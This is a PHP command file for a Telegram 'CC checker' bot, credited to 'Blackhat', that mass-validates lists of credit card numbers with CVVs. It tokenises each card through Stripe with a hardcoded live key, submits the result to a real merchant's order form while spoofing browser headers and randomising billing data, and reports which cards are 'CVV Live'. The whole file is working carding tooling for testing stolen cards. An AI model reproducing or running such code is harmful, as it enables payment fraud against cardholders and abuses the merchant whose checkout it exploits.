<?php
/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/

include __DIR__ . "/../config/config.php";
include __DIR__ . "/../config/variables.php";
include_once __DIR__ . "/../functions/bot.php";
include_once __DIR__ . "/../functions/db.php";
include_once __DIR__ . "/../functions/functions.php";

////////////====[MUTE]====////////////
if(strpos($message, "/mauth ") === 0 && $userId == $config['adminID']) {
    $antispam = antispamCheck($userId);
    addUser($userId, $username);

    if ($antispam != false) {
        bot('sendmessage', [
            'chat_id' => $chat_id,
            'text' => "[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
            'parse_mode' => 'html',
            'reply_to_message_id' => $message_id
        ]);
        return;
    } else {
        $messageidtoedit1 = bot('sendmessage', [
            'chat_id' => $chat_id,
            'text' => "<b>Wait for Result...</b>",
            'parse_mode' => 'html',
            'reply_to_message_id' => $message_id
        ]);

        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
 $ccList = substr($message, 7);
    $creditCards = explode("\n", $ccList);

    // Check if there are exactly 10 credit card entries
    if (count($creditCards) <= 15) {
        $responseText = '';
        foreach ($creditCards as $ccInfo) {
            $ccData = explode("|", $ccInfo);

            if (count($ccData) === 4) {
                $cc = trim($ccData[0]);
                $mes = trim($ccData[1]);
                $ano = trim($ccData[2]);
                $cvv = trim($ccData[3]);
            
            ###CHECKER PART###
            $zip = rand(10001, 90045);
            $time = rand(30000, 699999);
            $rand = rand(0, 99999);
            $pass = rand(0000000000, 9999999999);
            $email = substr(md5(mt_rand()), 0, 7);
            $name = substr(md5(mt_rand()), 0, 7);
            $last = substr(md5(mt_rand()), 0, 7);

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://m.stripe.com/6');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Host: m.stripe.com',
                'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
                'Accept: */*',
                'Accept-Language: en-US,en;q=0.5',
                'Content-Type: text/plain;charset=UTF-8',
                'Origin: https://m.stripe.network',
                'Referer: https://m.stripe.network/inner.html'
            ));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
            curl_setopt($ch, CURLOPT_POSTFIELDS, "");
            $res = curl_exec($ch);
            $muid = trim(strip_tags(capture($res, '"muid":"', '"')));
            $sid = trim(strip_tags(capture($res, '"sid":"', '"')));
            $guid = trim(strip_tags(capture($res, '"guid":"', '"')));

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/' . $cc . '');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Host: lookup.binlist.net',
                'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
            ));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
            $fim = curl_exec($ch);
            $bank = capture($fim, '"bank":{"name":"', '"');
            $cname = capture($fim, '"name":"', '"');
            $brand = capture($fim, '"brand":"', '"');
            $country = capture($fim, '"country":{"name":"', '"');
            $phone = capture($fim, '"phone":"', '"');
            $scheme = capture($fim, '"scheme":"', '"');
            $type = capture($fim, '"type":"', '"');
            $emoji = capture($fim, '"emoji":"', '"');
            $currency = capture($fim, '"currency":"', '"');
            $binlenth = strlen($bin);
            $schemename = ucfirst("$scheme");
            $typename = ucfirst("$type");

            /////////////////////==========[Unavailable if empty]==========////////////////

            if (empty($schemename)) {
                $schemename = "Unavailable";
            }
            if (empty($typename)) {
                $typename = "Unavailable";
            }
            if (empty($brand)) {
                $brand = "Unavailable";
            }
            if (empty($bank)) {
                $bank = "Unavailable";
            }
            if (empty($cname)) {
                $cname = "Unavailable";
            }
            if (empty($phone)) {
                $phone = "Unavailable";
            }

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Host: api.stripe.com',
                'Accept: application/json',
                'Accept-Language: en-US,en;q=0.9',
                'Content-Type: application/x-www-form-urlencoded',
                'Origin: https://js.stripe.com',
                'Referer: https://js.stripe.com/',
                'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'
            ));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
            curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&billing_details[address][postal_code]=$zip&guid=$guid&muid=$muid&sid=$sid&payment_user_agent=stripe.js%2Fc478317df%3B+stripe-js-v3%2Fc478317df&time_on_page=841454&key=pk_live_MtxwO3obi7pfD7UZlGkfR2yj&_stripe_account=acct_1LEXzVGik3vJTkpJ");
            $result1 = curl_exec($ch);

            $id = GetStr($result1, 'id": "', '"');
            $msg1 = GetStr($result1, '"message": "', '"');
            
            $url = "https://services.leadconnectorhq.com/funnels/order-form/initiate-one-step-payment";

            $curl = curl_init($url);
            curl_setopt($curl, CURLOPT_URL, $url);
            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

            $headers = array(
                "Host: services.leadconnectorhq.com",
                "Connection: keep-alive",
                "DNT: 1",
                "source: WEB_USER",
                "sec-ch-ua-mobile: ?0",
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.37",
                "Content-Type: application/json",
                "accept: application/json",
                "channel: APP",
                "version: 2021-04-15",
                "Origin: https://starparkusa.com",
                "Sec-Fetch-Site: cross-site",
                "Sec-Fetch-Mode: cors",
                "Sec-Fetch-Dest: empty",
                "Referer: https://starparkusa.com/",
                "Accept-Language: en-US,en;q=0.9",
                "Content-Length: 1371",
            );
            curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

            $data = '{"locationId":"4ukgAD0pZXFuJiYCxNk9","contactData":{"name":"s vgh","phone":"+15487965425","email":"avilovel2014@gmail.com","address":{},"timezone":"Asia/Calcutta"},"attribution":{"lead":true,"eventData":{"source":"direct","referrer":"","keyword":"","adSource":"","url_params":{},"page":{"url":"https://starparkusa.com/gift-cards-and-products","title":""},"timestamp":1686142531432,"campaign":"","contactSessionIds":{"ids":["698e6b5a-66d7-44ae-bddb-ee7c22ab7d62","cc6a34e6-ca24-4907-b386-fb6f1cbfe179"]},"fbp":"","fbc":"","type":"page-visit","parentId":"","pageVisitType":"text-widget","domain":"starparkusa.com","version":"v3","parentName":"","fingerprint":null,"gaClientId":"GA1.1.1646513606.1686066831","medium":"order_form","mediumId":"46c5f268-eadc-444f-9c91-9995f06b0e97"},"source":"Star Park USA","pageId":"UXz0CSnq2Fo35bSKwtm6","funnelId":"WWRsMusmXvdZaQ49cBcV","sessionId":"cc6a34e6-ca24-4907-b386-fb6f1cbfe179","funnelEventData":{"eventType":"optin","domainName":"starparkusa.com","pageUrl":"/gift-cards-and-products","funnelId":"WWRsMusmXvdZaQ49cBcV","pageId":"UXz0CSnq2Fo35bSKwtm6","stepId":"46c5f268-eadc-444f-9c91-9995f06b0e97"},"sessionFingerprint":null},"selectedProductsWithQty":[{"id":"63794ffe945e5f971f710e4d","qty":1}],"paymentProvider":"stripe","couponSessionId":"bd8f98ff-4d4c-45e1-9146-54767c7aba86","paymentMethodId":"'.$id.'"}';

            curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

            //for debug only!
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

            $result2 = curl_exec($curl);
            $errormessage = trim(strip_tags(capture($result2, 'message":"', '"')));
              
            $info = curl_getinfo($ch);
            $time = $info['total_time'];
            $time = substr_replace($time, '', 4);

            ###END OF CHECKER PART###
            addTotal();
            addUserTotal($userId);

            if (strpos($result2, 'client_secret') || strpos($result2, 'Your card does not support this') || strpos($result2, 'clientSecret')) {
                addCVV();
                addUserCVV($userId);
                addCCN();
                addUserCCN($userId);
                $msg2 = 'CVV Live✅';
                $responseText .= "\n<b>Card:</b> <code>$cc|$mes|$ano|$cvv</code>\n<b>Status:</b> $msg2\nBypassing -» 0\nGateway -» User Stripe Merchant\nTime -» <b>$time</b><b>s</b>\n\n";
              
             } elseif ($result2 == null && !$stripeerror) {
                $msg2 = 'API Down ❌';
                $responseText .= "\n<b>Card:</b> <code>$cc|$mes|$ano|$cvv</code>\n<b>Status:</b> $msg2\nBypassing -» 0\nGateway -» User Stripe Merchant\nTime -» <b>$time</b><b>s</b>\n\n";
            } elseif(strpos($result2, !'client_secret')) {
                $msg2 = 'Card Declined❌';
                $responseText .= "\n<b>Card:</b> <code>$cc|$mes|$ano|$cvv</code>\n<b>Status:</b> $msg2\nBypassing -» 0\nGateway -» User Stripe Merchant\nTime -» <b>$time</b><b>s</b>\n\n";
            }
          }

        }
    }
}
               bot('editMessageText', [
                'chat_id' => $chat_id,
                'message_id' => $messageidtoedit,
                'text' => "Gate Mass Auth<code>$lista</code>

<b> $responseText</b>
<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/+6T-YczOeDyYzYWNk'>Blackhat</a></b>",
                'parse_mode' => 'html',
                'disable_web_page_preview' => 'true'
            ]);
}
?>